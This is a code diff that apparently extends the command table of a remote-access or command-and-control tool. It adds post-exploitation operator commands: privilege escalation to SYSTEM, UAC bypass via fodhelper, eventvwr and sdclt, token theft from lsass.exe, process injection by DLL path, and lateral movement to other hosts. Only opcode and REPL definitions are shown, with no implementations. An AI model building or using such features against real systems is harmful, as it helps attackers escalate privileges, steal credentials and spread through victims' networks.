@@ -23,6 +23,12 @@ CMD_NETINFO = 0x09
 CMD_EXEC = 0x0A
 CMD_EXEC_PS = 0x0B
 CMD_EXIT = 0x0D
+# Post-exploitation commands
+CMD_GETSYSTEM = 0x20
+CMD_UAC_BYPASS = 0x21
+CMD_TOKEN = 0x22
+CMD_INJECT = 0x23
+CMD_LATERAL = 0x24
 CMD_NOOP = 0xFF
 
 CMD_NAMES = {
@@ -38,6 +44,11 @@ CMD_NAMES = {
     CMD_EXEC: "EXEC",
     CMD_EXEC_PS: "EXEC_PS",
     CMD_EXIT: "EXIT",
+    CMD_GETSYSTEM: "GETSYSTEM",
+    CMD_UAC_BYPASS: "UAC_BYPASS",
+    CMD_TOKEN: "TOKEN",
+    CMD_INJECT: "INJECT",
+    CMD_LATERAL: "LATERAL",
     CMD_NOOP: "NOOP",
 }
 
@@ -50,6 +61,15 @@ REPL_CMD_MAP = {
     "exit": (CMD_EXIT, b""),
     "quit": (CMD_EXIT, b""),
     "heartbeat": (CMD_HEARTBEAT, b""),
+    # Post-exploitation commands
+    "getsystem": (CMD_GETSYSTEM, b""),
+    "uac": (CMD_UAC_BYPASS, b"fodhelper"),  # default method
+    "uac_fodhelper": (CMD_UAC_BYPASS, b"fodhelper"),
+    "uac_eventvwr": (CMD_UAC_BYPASS, b"eventvwr"),
+    "uac_sdclt": (CMD_UAC_BYPASS, b"sdclt"),
+    "token_steal": (CMD_TOKEN, b"steal|lsass.exe"),
+    "token_revert": (CMD_TOKEN, b"revert"),
+    # inject and lateral require args: inject <pid>|<dll_path>, lateral <method>|<host>|<cmd>
 }
 
 HDR_FMT = "<II"
